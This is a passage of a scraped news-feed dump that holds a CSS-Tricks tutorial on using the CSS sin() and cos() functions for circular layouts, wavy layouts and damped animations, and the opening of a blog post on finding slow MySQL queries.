    &lt;p&gt;Despite this good news, roughly one third of women screened during the study period still had infection with high-risk HPV types not covered by the original vaccines – and new infections with these types were more frequent among vaccinated women, compared to unvaccinated ones.&lt;/p&gt;
    &lt;p&gt;This is expected to fall once girls who received the more recent ‘nine-valent’ vaccine reach screening age. At this point, the screening guidelines should potentially be reconsidered, Nonboe and colleagues said.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45265745</guid><pubDate>Tue, 16 Sep 2025 18:12:29 +0000</pubDate></item><item><title>How to make the Framework Desktop run even quieter</title><link>https://noctua.at/en/how-to-make-the-framework-desktop-run-even-quieter</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45266039</guid><pubDate>Tue, 16 Sep 2025 18:33:21 +0000</pubDate></item><item><title>Should We Drain the Everglades?</title><link>https://rabbitcavern.substack.com/p/should-we-drain-the-everglades</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45266854</guid><pubDate>Tue, 16 Sep 2025 19:33:35 +0000</pubDate></item><item><title>The "Most Hated" CSS Feature: Cos() and Sin()</title><link>https://css-tricks.com/the-most-hated-css-feature-cos-and-sin/</link><description>&lt;doc fingerprint="3f01bb27012dfba9"&gt;
  &lt;main&gt;&lt;p&gt;No feature is truly “the worst” in CSS, right? After all, it’s all based on opinion and personal experience, but if we had to reach a consensus, checking the State of CSS 2025 results would be a good starting point. I did exactly that, jumped into the awards section, and there I found it: the “Most Hated Feature,” a title no CSS should have bear…&lt;/p&gt;&lt;p&gt;This shocks me, if I’m being honest. Are really trigonometric functions really that hated? I know “hated” is not the same as saying something is “worst”, but it still has an awful ring to it. And I know I’m being a little dramatic here, since only “9.1% of respondents truly hate trigonometry.” But that’s still too much shade being thrown for my taste.&lt;/p&gt;&lt;p&gt;I want to eliminate that 9.1%. So, in this series, I want to look at practical uses for CSS trigonometric functions. We’ll tackle them in pieces because there’s a lot to take in and I find it easiest to learn and retain information when it’s chunked into focused, digestible pieces. And we’ll start with what may be the most popular functions of the “worst” feature: &lt;code&gt;sin()&lt;/code&gt; and &lt;code&gt;cos()&lt;/code&gt;.&lt;/p&gt;&lt;head rend="h4"&gt;CSS Trigonometric Functions: The “Most Hated” CSS Feature&lt;/head&gt;&lt;list rend="ol"&gt;&lt;item&gt;&lt;code&gt;sin()&lt;/code&gt;and&lt;code&gt;cos()&lt;/code&gt;(You are here!)&lt;/item&gt;&lt;item&gt;Tackling the CSS &lt;code&gt;tan()&lt;/code&gt;Function (coming soon)&lt;/item&gt;&lt;item&gt;Inverse functions: &lt;code&gt;asin()&lt;/code&gt;,&lt;code&gt;acos()&lt;/code&gt;,&lt;code&gt;atan()&lt;/code&gt;and&lt;code&gt;atan2()&lt;/code&gt;(coming soon)&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;&lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; anyway?&lt;/head&gt; What the heck are &lt;p&gt;This section is for those who &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; don’t quite click yet, or simply want a refresher. If you aced trigonometry quizzes in high school, feel free to skip ahead to the next section!&lt;/p&gt;&lt;p&gt;What I find funny about &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt;— and also why I think there is confusion around them — is the many ways we can describe them. We don’t have to look too hard. A quick glance at this Wikipedia page has an eye-watering number of super nuanced definitions.&lt;/p&gt;&lt;p&gt;This is a learning problem in the web development field. I feel like some of those definitions are far too general and lack detail about the essence of what trigonometric functions like &lt;code&gt;sin()&lt;/code&gt; and &lt;code&gt;cos()&lt;/code&gt; can do. Conversely, other definitions are overly complex and academic, making them tough to grok without an advanced degree.&lt;/p&gt;&lt;p&gt;Let’s stick to the sweet middle spot: the unit circle.&lt;/p&gt;&lt;p&gt;Meet the unit circle. It is a circle with a radius of one unit:&lt;/p&gt;&lt;p&gt;Right now it’s alone… in space. Let’s place it on the Cartesian coordinate system (the classic chart with X and Y axes). We describe each point in space in Cartesian coordinates:&lt;/p&gt;&lt;list rend="ol"&gt;&lt;item&gt;The X coordinate: The horizontal axis, plotting the point towards the left or right.&lt;/item&gt;&lt;item&gt;The Y coordinate: The vertical axis, plotting the point towards the top or bottom.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;We can move through the unit circle by an angle, which is measured from the positive X-axis going counter-clockwise.&lt;/p&gt;&lt;p&gt;We can go in a clockwise direction by using negative angles. As my physics teacher used to say, “Time is negative!”&lt;/p&gt;&lt;p&gt;Notice how each angle lands on a unique point in the unit circle. How else can we describe that point using Cartesian coordinates?&lt;/p&gt;&lt;p&gt;When the angle is &lt;code&gt;0°&lt;/code&gt; the X and Y coordinates are 1 and 0 (&lt;code&gt;1&lt;/code&gt;, &lt;code&gt;0&lt;/code&gt;), respectively. We can deduce the Cartesian coordinates for other angles just as easily, like &lt;code&gt;90°&lt;/code&gt;, &lt;code&gt;180°&lt;/code&gt; and &lt;code&gt;270°&lt;/code&gt;. But for any other angle, we don’t know where the point is initially located on the unit circle.&lt;/p&gt;&lt;p&gt;If only there were a pair of functions that take an angle and give us our desired coordinates…&lt;/p&gt;&lt;p&gt;You guessed it, the CSS &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; functions do exactly that. And they’re very closely related, where &lt;code&gt;cos()&lt;/code&gt; is designed to handle the X coordinate and &lt;code&gt;sin()&lt;/code&gt; returns the Y coordinate.&lt;/p&gt;&lt;p&gt;Play with the toggle slider in the following demo to see the relationship between the two functions, and notice how they form a right triangle with the initial point on the unit circle:&lt;/p&gt;&lt;p&gt;I think that’s all you really need to know about &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; for the moment. They’re mapped to Cartesian coordinates, which allows us to track a point along the unit circle with an angle, no matter what size that circle happens to be.&lt;/p&gt;&lt;p&gt;Let’s dive into what we can actually use &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; for our everyday CSS work. It’s always good to put a little real-world context to theoretical concepts like math.&lt;/p&gt;&lt;head rend="h3"&gt;Circular layouts&lt;/head&gt;&lt;p&gt;If we go by the unit circle definition of &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt;, then it’s easy to see how they might be used to create circular layouts in CSS.  The initial setup is a single row of circular elements:&lt;/p&gt;&lt;p&gt;Say we want to place each circular item around the outline of a larger circle instead. First, we would let CSS know the total number of elements and also each element’s index (the order it’s in), something we can do with an inline CSS variable that holds each order in the position:&lt;/p&gt;&lt;code&gt;&amp;lt;ul style="--total: 9"&amp;gt;
  &amp;lt;li style="--i: 0"&amp;gt;0&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 1"&amp;gt;1&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 2"&amp;gt;2&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 3"&amp;gt;3&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 4"&amp;gt;4&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 5"&amp;gt;5&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 6"&amp;gt;6&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 7"&amp;gt;7&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 8"&amp;gt;8&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;&lt;/code&gt;



&lt;p&gt;Note: This step will become much easier and concise when the &lt;code&gt;sibling-index()&lt;/code&gt; and &lt;code&gt;sibling-count()&lt;/code&gt; functions gain support (and they’re really neat). I’m hardcoding the indexes with inline CSS variables in the meantime.&lt;/p&gt;&lt;p&gt;To place the items around the outline of a larger circle, we have to space them evenly by a certain angle. And to get that angle, we can divide &lt;code&gt;360deg&lt;/code&gt; (a full turn around the circle) by the total number of items, which is 8 in this specific example. Then, to get each element’s specific angle, we can multiply the angle spacing by the element’s index (i.e., position):&lt;/p&gt;&lt;code&gt;li {
  --rotation: calc(360deg / var(--total) * var(--i));
}&lt;/code&gt;



&lt;p&gt;We also need to push the items away from the center, so we’ll assign a &lt;code&gt;--radius&lt;/code&gt; value for the circle using another variable.&lt;/p&gt;&lt;code&gt;ul {
  --radius: 10rem;
}&lt;/code&gt;



&lt;p&gt;We have the element’s angle and radius. What’s left is to calculate the X and Y coordinates for each item.&lt;/p&gt;&lt;p&gt;That’s where &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; come into the picture. We use them to get the X and Y coordinates that place each item around the unit circle, then multiply each coordinate by the &lt;code&gt;--radius&lt;/code&gt; value to get an item’s final position on the bigger circle:&lt;/p&gt;&lt;code&gt;li {
  /* ... */
  position: absolute;

  transform: translateX(calc(cos(var(--rotation)) * var(--radius))) 
             translateY(calc(sin(var(--rotation)) * var(--radius)));
}&lt;/code&gt;



&lt;p&gt;That’s it! We have a series of eight circular items placed evenly around the outline of a larger circle:&lt;/p&gt;&lt;p&gt;And we didn’t need to use a bunch of magic numbers to do it! All we provide CSS with is the unit circle’s radius, and then CSS does all the trigonometric gobbledygook that makes so many of us call this the “worst” CSS feature. Hopefully, I’ve convinced you to soften your opinions on them if that’s what was holding you back!&lt;/p&gt;&lt;p&gt;We aren’t limited to full circles, though! We can also have a semicircular arrangement by choosing &lt;code&gt;180deg&lt;/code&gt; instead of &lt;code&gt;360deg&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;This opens up lots of layout possibilities. Like, what if we want a circular menu that expands from a center point by transitioning the radius of the circle? We can totally do that:&lt;/p&gt;&lt;p&gt;Click or hover the heading and the menu items form around the circle!&lt;/p&gt;&lt;head rend="h3"&gt;Wavy layouts&lt;/head&gt;&lt;p&gt;There’s still more we can do with layouts! If, say, we plot the &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; coordinates on a two-axis graph, notice how they give us a pair of waves that periodically go up and down. And notice they are offset from each other along the horizontal (X) axis:&lt;/p&gt;&lt;p&gt;Where do these waves come from? If we think back to the unit circle we talked about earlier, the value of &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt; oscillate between &lt;code&gt;-1&lt;/code&gt; and &lt;code&gt;1&lt;/code&gt;. In other words, the lengths match when the angle around the unit circle varies. If we graph that oscillation, then we’ll get our wave and see that they’re sorta like reflections of each other.&lt;/p&gt;&lt;head&gt;⚠️ Auto-playing media&lt;/head&gt;&lt;p&gt;Can we place an element following one of these waves? Absolutely. Let’s start with the same single row layout of circular items we made earlier. This time, though, the length of that row spans beyond the viewport, causing overflow.&lt;/p&gt;&lt;p&gt;We’ll assign an index position for each item like we did before, but this time we don’t need to know the total number of items. We had eight items last time, so let’s bump that up to 10 and pretend like we don’t know that:&lt;/p&gt;&lt;code&gt;&amp;lt;ul&amp;gt;
  &amp;lt;li style="--i: 0"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 1"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 2"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 3"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 4"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 5"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 6"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 7"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 8"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 9"&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;li style="--i: 10"&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;&lt;/code&gt;



&lt;p&gt;We want to vary the element’s vertical position along either a &lt;code&gt;sin()&lt;/code&gt; or &lt;code&gt;cos()&lt;/code&gt; wave, meaning translating each item’s position based on its order in the index. We’ll multiply an item’s index by a certain angle that is passed into the &lt;code&gt;sin()&lt;/code&gt; function, and that will return a ratio that describes how high or low the element should be on the wave. The final thing is to multiply that result by a length value, which I calculated as half  an item’s total size.&lt;/p&gt;&lt;p&gt;Here’s the math in CSS-y terms:&lt;/p&gt;&lt;code&gt;li {
  transform: translateY(calc(sin(60deg * var(--i)) * var(--shape-size) / 2));
}&lt;/code&gt;



&lt;p&gt;I’m using a &lt;code&gt;60deg&lt;/code&gt; value because the waves it produces are smoother than some other values, but we can vary it as much as we want to get cooler waves. Play around with the toggle in the next demo and watch how the wave’s intensity changes with the angle:&lt;/p&gt;&lt;p&gt;This is a great example to see what we’re working with, but how would you use it in your work? Imagine we have two of these wavy chains of circles, and we want to intertwine them together, kinda like a DNA strand.&lt;/p&gt;&lt;p&gt;Let’s say we’re starting with the HTML structure for two unordered lists nested inside another unordered list. The two nested unordered lists represent the two waves that form the chain pattern:&lt;/p&gt;&lt;code&gt;&amp;lt;ul class="waves"&amp;gt;
  &amp;lt;!-- First wave --&amp;gt;
  &amp;lt;li&amp;gt;
    &amp;lt;ul class="principal"&amp;gt;
      &amp;lt;!-- Circles --&amp;gt;
      &amp;lt;li style="--i: 0"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;li style="--i: 1"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;li style="--i: 2"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;li style="--i: 3"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;!-- etc.  --&amp;gt;
    &amp;lt;/ul&amp;gt;
  &amp;lt;/li&amp;gt;

  &amp;lt;!-- Second wave --&amp;gt;
  &amp;lt;li&amp;gt;
    &amp;lt;ul class="secondary"&amp;gt;
      &amp;lt;!-- Circles --&amp;gt;
      &amp;lt;li style="--i: 0"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;li style="--i: 1"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;li style="--i: 2"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;li style="--i: 3"&amp;gt;&amp;lt;/li&amp;gt;
      &amp;lt;!-- etc.  --&amp;gt;
    &amp;lt;/ul&amp;gt;
  &amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;&lt;/code&gt;



&lt;p&gt;Pretty similar to the examples we’ve seen so far, right? We’re still working with an unordered list where the items are indexed with a CSS variable, but now we’re working with two of those lists… and they’re contained inside a third unordered list. We don’t have to structure this as lists, but I decided to leave them so I can use them as hooks for additional styling later.&lt;/p&gt;&lt;p&gt;To avoid any problems, we’ll ignore the two direct &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; elements in the outer unordered list that contain the other lists using &lt;code&gt;display: contents&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;.waves &amp;gt; li { display: contents; }&lt;/code&gt;



&lt;p&gt;Notice how one of the chains is the “principal” while the other is the “secondary.” The difference is that the “secondary” chain is positioned behind the “principal” chain. I’m using slightly different background colors for the items in each chain, so it’s easier to distinguish one from the other as you scroll through the block-level overflow.&lt;/p&gt;&lt;p&gt;We can reorder the chains using a stacking context:&lt;/p&gt;&lt;code&gt;.principal {
  position: relative;
  z-index: 2;
}

.secondary { position: absolute; }&lt;/code&gt;



&lt;p&gt;This positions one chain on top of the other. Next, we will adjust each item’s vertical position with the “hated” &lt;code&gt;sin()&lt;/code&gt; and &lt;code&gt;cos()&lt;/code&gt; functions. Remember, they’re sorta like reflections of one another, so the variance between the two is what offsets the waves to form two intersecting chains of items:&lt;/p&gt;&lt;code&gt;.principal {
  /* ... */
  li {
    transform: translateY(calc(sin(60deg * var(--i)) * var(--shape-size) / 2));
  }
}

.secondary {
  /* ... */
  li {
    transform: translateY(calc(cos(60deg * var(--i)) * var(--shape-size) / 2));
  }
}&lt;/code&gt;



&lt;p&gt;We can accentuate the offset even more by shifting the &lt;code&gt;.secondary&lt;/code&gt; wave another &lt;code&gt;60deg&lt;/code&gt;:&lt;/p&gt;&lt;code&gt;.secondary {
  /* ... */
  li {
    transform: translateY(calc(cos(60deg * var(--i) + 60deg) * var(--shape-size) / 2));
  }
}&lt;/code&gt;



&lt;p&gt;The next demo shows how the waves intersect at an offset angle of &lt;code&gt;60deg&lt;/code&gt;. Adjust the slider toggle to see how the waves intersect at different angles:&lt;/p&gt;&lt;p&gt;Oh, I told you this could be used in a practical, real-world way. How about adding a little whimsy and flair to a hero banner:&lt;/p&gt;&lt;head rend="h3"&gt;Damped oscillatory animations&lt;/head&gt;&lt;p&gt;The last example got me thinking: is there a way to use &lt;code&gt;sin()&lt;/code&gt; and &lt;code&gt;cos()&lt;/code&gt;‘s back and forth movement for animations? The first example that came to mind was an animation that also went back and forth, something like a pendulum or a bouncing ball.&lt;/p&gt;&lt;p&gt;This is, of course, trivial since we can do it in a single &lt;code&gt;animation&lt;/code&gt; declaration:&lt;/p&gt;&lt;code&gt;.element {
  animation: someAnimation 1s infinite alternate;
}&lt;/code&gt;



&lt;p&gt;This “back and forth” animation is called oscillatory movement. And while &lt;code&gt;cos()&lt;/code&gt; or &lt;code&gt;sin()&lt;/code&gt; are used to model oscillations in CSS, it would be like reinventing the wheel (albeit a clunkier one).&lt;/p&gt;&lt;p&gt;I’ve learned that perfect oscillatory movement — like a pendulum that swings back and forth in perpetuity, or a ball that never stops bouncing — doesn’t really exist. Movement tends to decay over time, like a bouncing spring:&lt;/p&gt;&lt;head&gt;⚠️ Auto-playing media&lt;/head&gt;&lt;p&gt;There’s a specific term that describes this: damped oscillatory movement. And guess what? We can model it in CSS with the &lt;code&gt;cos()&lt;/code&gt; function! If we graph it over time, then we will see it goes back and forth while getting closer to the resting position1.&lt;/p&gt;&lt;p&gt;Wikipedia has another animated example that nicely demonstrates what damped oscillation looks like.&lt;/p&gt;&lt;p&gt;In general, we can describe damped oscillation over time as a mathematical function:&lt;/p&gt;&lt;p&gt;It’s composed of three parts:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;e−γt: Due to the negative exponent, it becomes exponentially smaller as time passes, bringing the movement to a gradual stop. It is multiplied by a damping constant (γ) that specifies how quickly the movement should decay.&lt;/item&gt;&lt;item&gt;a: This is the initial amplitude of the oscillation, i.e., the element’s initial position.&lt;/item&gt;&lt;item&gt;cos(ωt−α): This gives the movement its oscillation as time passes. Time is multiplied by frequency (ω), which determines an element’s oscillation speed2. We can also subtract from time α, which we can use to offset the initial oscillation of the system.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Okay, enough with all the theory! How do we do it in CSS? We’ll set the stage with a single circle sitting all by itself.&lt;/p&gt;&lt;p&gt;We have a few CSS variables we can define that will come in handy since we already know the formula we’re working with:&lt;/p&gt;&lt;code&gt;:root {
  --circle-size: 60px;

  --amplitude: 200px; /* The amplitude is the distance, so let's write it in pixels*/
  --damping: 0.3;
  --frequency: 0.8;
  --offset: calc(pi/2); /* This is the same as 90deg! (But in radians) */
}&lt;/code&gt;



&lt;p&gt;Given these variables, we can peek at what the animation would look like on a graph using a tool like GeoGebra:&lt;/p&gt;&lt;p&gt;From the graph, we can see that the animation starts at &lt;code&gt;0px&lt;/code&gt; (thanks to our offset), then peaks around &lt;code&gt;140px&lt;/code&gt; and dies out around &lt;code&gt;25s&lt;/code&gt; in. I, for one, won’t be waiting 25 seconds for the animation to end, so let’s create a &lt;code&gt;--progress&lt;/code&gt; property that will animate between &lt;code&gt;0&lt;/code&gt; to &lt;code&gt;25&lt;/code&gt;, and will act as our “time” in the function.&lt;/p&gt;&lt;p&gt;Remember that to animate or transition a custom property, we’ve gotta register it with the &lt;code&gt;@property&lt;/code&gt; at-rule.&lt;/p&gt;&lt;code&gt;@property --progress {
  syntax: "&amp;lt;number&amp;gt;";
  initial-value: 0;
  inherits: true;
}

@keyframes movement {
  from { --progress: 0; }
  to { --progress: 25; }
}&lt;/code&gt;



&lt;p&gt;What’s left is to implement the prior formula for the element’s movement, which, written in CSS terms, looks like this:&lt;/p&gt;&lt;code&gt;.circle {
  --oscillation: calc(
    (exp(-1 * var(--damping) * var(--progress))) * 
    var(--amplitude) * 
    cos(var(--frequency) * (var(--progress)) - var(--offset))
  );

  transform: translateX(var(--oscillation));
  animation: movement 1s linear infinite;
}&lt;/code&gt;







&lt;p&gt;This gives a pretty satisfying animation by itself, but the damped motion is only on the x-axis. What would it look like if, instead, we applied the damped motion on both axes? To do this, we can copy the same oscillation formula for x, but replace the &lt;code&gt;cos()&lt;/code&gt; with &lt;code&gt;sin()&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;.circle {
  --oscillation-x: calc(
    (exp(-1 * var(--damping) * var(--progress))) * 
    var(--amplitude) * 
    cos(var(--frequency) * (var(--progress)) - var(--offset))
  );
  --oscillation-y: calc(
    (exp(-1 * var(--damping) * var(--progress))) * 
    var(--amplitude) * 
    sin(var(--frequency) * (var(--progress)) - var(--offset))
  );

  transform: translateX(var(--oscillation-x)) translateY(var(--oscillation-y));
  animation: movement 1s linear infinite;
}&lt;/code&gt;







&lt;p&gt;This is even more satisfying! A circular and damped motion, all thanks to &lt;code&gt;cos()&lt;/code&gt; and &lt;code&gt;sin()&lt;/code&gt;. Besides looking great, how could this be used in a real layout?&lt;/p&gt;&lt;p&gt;We don’t have to look too hard. Take, for example, this sidebar I recently made where the menu items pop in the viewport with a damped motion:&lt;/p&gt;&lt;p&gt;Pretty neat, right?!&lt;/p&gt;&lt;head rend="h3"&gt;More trigonometry to come!&lt;/head&gt;&lt;p&gt;Well, finding uses for the “most hated CSS feature” wasn’t that hard; maybe we should start showing some love to trigonometric functions. But wait. There are still several trigonometric functions in CSS we haven’t talked about. In the following posts, we’ll keep exploring what trig functions (like &lt;code&gt;tan()&lt;/code&gt; and inverse functions) can do in CSS.&lt;/p&gt;&lt;head rend="h4"&gt;CSS Trigonometric Functions: The “Most Hated” CSS Feature&lt;/head&gt;&lt;list rend="ol"&gt;&lt;item&gt;&lt;code&gt;sin()&lt;/code&gt;and&lt;code&gt;cos()&lt;/code&gt;(You are here!)&lt;/item&gt;&lt;item&gt;Tackling the CSS &lt;code&gt;tan()&lt;/code&gt;Function (coming soon)&lt;/item&gt;&lt;item&gt;Inverse functions: &lt;code&gt;asin()&lt;/code&gt;,&lt;code&gt;acos()&lt;/code&gt;,&lt;code&gt;atan()&lt;/code&gt;and&lt;code&gt;atan2()&lt;/code&gt;(coming soon)&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Also, before I forget, here is another demo I made using cos() and sin() that didn’t make the cut in this article, but it is still worth checking out because it dials up the swirly-ness from the last example to show how wacky we can get.&lt;/p&gt;&lt;head rend="h4"&gt;Footnotes&lt;/head&gt;&lt;list rend="ol"&gt;&lt;item&gt;This kind of damped oscillatory movement, where the back and forth is more visible, is called underdamped oscillation. There are also overdamped and critically damped oscillations, but we won’t focus on them here. ↪️&lt;/item&gt;&lt;item&gt;In reality, the damped constant and the frequency are closely related. You can read more about damped oscillation in this paper. ↪️&lt;/item&gt;&lt;/list&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45267336</guid><pubDate>Tue, 16 Sep 2025 20:10:59 +0000</pubDate></item><item><title>SQL performance improvements: finding the right queries to fix</title><link>https://ohdear.app/news-and-updates/sql-performance-improvements-finding-the-right-queries-to-fix-part-1</link><description>&lt;doc fingerprint="f3399dd54fb31822"&gt;
  &lt;main&gt;
    &lt;p&gt;SQL performance improvements: finding the right queries to fix (part 1) Published on September 17, 2025 by Mattias Geniar @mattiasgeniar Mattias Geniar September 17, 2025 A few weeks ago, we massively improved the performance of the dashboard &amp;amp; website by optimizing some of our SQL queries. In this post, we'll share how we identified the queries that needed work. In the next post, we'll explore how we fixed each of them. We'll cover the basics and gradually work our way up to the more advanced/complex ways of identifying slow queries. In this post, you'll see: Using a local debug-bar to identify queries Using MySQL slow query log Logging queries that don't use indexes Evaluating currently running queries live Analysing the global query log 2 MySQL bonusses: better CLI output &amp;amp; redirecting output to files Enforce eager loading in local Laravel environment Let's go! What these results look like # As a reminder, this is the resulting performance gain for the dashboard &amp;amp; some of our internal APIs: These graphs come from the Oh Dear uptime &amp;amp; performance monitoring we perform. Now let's get started identifying which queries need optimising. Enable the debug-bar in your local environment # The easiest place to start investigating queries is locally, in your development environment. Most frameworks have the concept of a "debug bar" - in the case of Laravel applications, the most widely used is the barryvdh/laravel-debugbar package that offers excellent insights. Once enabled, you can see output similar to this: It contains, at a glance: The total time spent executing SQL queries (top-right) The total amount of queries executed (top-left) How many of those were duplicates (indicating potential N+1 loop issues) Before optimising any query, it makes sense to ask the question: can the query be avoided in the first place? Duplicate queries are worth investigating, as well as queries that don't add meaning to the page you're seeing (ie a Class being lazy-loaded whose data isn't needed on this page). In our case, if we're looking at the data being loaded on an uptime monitor, we wouldn't expect a SQL query to load data for a broken link monitor. For this, you need application-awareness to know what data makes sense to load on that page. Let MySQL tell you which queries are slow # MySQL has the ability to enable a "slow query log", where you get to decide what qualifies as a slow query. This is the easiest step to get started, as MySQL will log to disk the SQL queries that exceeded your threshold. First, create the file to be used as the log (as the root user): $ touch /var/log/mysql-slow-query.log $ chown mysql:mysql /var/log/mysql-slow-query.log This creates an empty file and allows MySQL to read &amp;amp; write to it. If the file doesn't exist, MySQL won't create it for you, it just won't log anything. Next, hop in your MySQL command-line and activate the Slow Query Log. $ mysql mysql&amp;gt; SET GLOBAL slow_query_log_file = '/var/log/mysql-slow-query.log'; mysql&amp;gt; SET GLOBAL long_query_time = 1; mysql&amp;gt; SET GLOBAL slow_query_log = 'ON'; From this point, MySQL will log every query that exceeded the 1s threshold in your log file. Tweak the "long query time" as you see fit. $ tail -f /var/log/mysql-slow-query.log # Query_time: 2.547717 Lock_time: 0.000003 Rows_sent: 0 Rows_examined: 0 SET timestamp=1757095277; select * from `runs` where `runs`.`check_id` = ...; This will give you a list of your slow queries, ready to be optimized. The example above will modify your currently running MySQL instance to log queries, but if you restart your MySQL server, the settings won't be persisted. If you want to have this enabled all the time, it needs to be added to your my.cnf config file: [mysqld] slow_query_log = ON slow_query_log_file = /var/log/mysql-slow-query.log long_query_time = 1 You can gradually increase the slow query threshold, MySQL allows decimal values to log queries that are faster than 500ms, 300ms, etc. mysql&amp;gt; SET GLOBAL long_query_time = 0.3; This would let MySQL log all queries that are slower than 300ms. If the results become too verbose, you can tweak how many queries get logged a bit more by setting a minimal amount of rows that a query should return, before it's logged. mysql&amp;gt; SET GLOBAL min_examined_row_limit = 1000; Queries that examine fewer than this number of rows will not be logged to the slow query log. Let MySQL tell you which queries lack indexes # Spoiler alert: a fast query usually has indexes on them that make retrieving the data blazing fast. We'll explore how to set those &amp;amp; decide which ones to set in future posts. MySQL can log all queries that are being executed that don't use an index for lookups. This can get a little noisy, especially if you haven't added indexes before, so this is a setting to enable once you've done the 2 tips shared above first, to trim down on the log-noise this might generate. mysql&amp;gt; SET GLOBAL log_queries_not_using_indexes = ON; This will log all sorts of queries, including queries like: SELECT * FROM users: a full table scan (without a WHERE clause) SELECT * FROM users WHERE email = '[email protected]': a WHERE clause on a non-index column SELECT * FROM users WHERE UPPER(email) = '[email protected]: a function call on an indexed column (this prevents index usage) SELECT * FROM users WHERE name LIKE '%mattias%': using a leading wildcard in a LIKE statement I wouldn't recommend running log_queries_not_using_indexes all the time, just for debugging &amp;amp; analysis purposes. The log_queries_not_using_indexes is also compatible with the same min_examined_row_limit option we shared in the previous tip, so you can limit the logging of non-indexed queries by adding: mysql&amp;gt; SET GLOBAL min_examined_row_limit = 1000; If you have a high amount of queries without indexes and a busy MySQL server, the log activity can also become a bottleneck. Keep this in mind and disable it again once you're done with your analysis. mysql&amp;gt; SET GLOBAL log_queries_not_using_indexes = OFF; Ps; feels weird writing queries that set a value to what seems to be a string, right? The values for OFF and ON are reserved keywords, similar to TRUE or FALSE, so they don't need quotes. Let MySQL tell you which queries are executed right now # As a rule of thumb, I like to use: whenever I can see a query being executed right now, it probably can use some optimisations. Think about that logic for a second: ideally, queries are finished under 10ms or faster. What are the odds that when I request the current processlist, a query will show up? It becomes such a narrow window that when you look at the current processlist a few times, and you see the same queries showing up over and over again, they're worth investigating. Let's start with the basics: mysql&amp;gt; SHOW FULL PROCESSLIST; If this returns a lot of results, you can use the raw SQL query to be able to filter the results based on your own criteria. The SHOW FULL PROCESSLIST is essentially a shortcut for the following SQL query: mysql&amp;gt; SELECT ID, USER, HOST, DB, COMMAND, TIME, STATE, INFO FROM performance_schema.processlist ORDER BY ID; So you're able to trim down the output a little by avoiding Sleeping connections or from databases or users you don't need (if you're hosting multiple databases on this system); mysql&amp;gt; SELECT ID, USER, HOST, DB, COMMAND, TIME, STATE, INFO FROM performance_schema.processlist WHERE DB = 'ohdear' AND COMMAND != 'Sleep'; If you run this command a few times in a row and you see the same types of queries showing up, even if they have indexes, they're worth noting for followup. The output of PROCESSLIST and the content of the performance_schema.processlist have a limitation that the TIME only has seconds granularity, so it's hard to sort on. As a workaround, once you need more insights into &amp;lt; 1 second queries, you can run the following query: mysql&amp;gt; SELECT t.processlist_id, t.processlist_user, t.processlist_host, t.processlist_db, t.processlist_command, t.processlist_state, t.processlist_info, ROUND(s.timer_wait/1000000, 2) as execution_time_ms FROM performance_schema.threads t JOIN performance_schema.events_statements_current s ON t.thread_id = s.thread_id WHERE t.processlist_command != 'Sleep' AND s.timer_wait IS NOT NULL ORDER BY s.timer_wait DESC; This will show the time spent in miliseconds in the execution_time_ms column. Let MySQL tell you which queries get executed the most # Caution: on high-traffic MySQL servers, this will become a major bottleneck! Be careful. This one is best to enable locally, in your development environment. Sure, you can try to 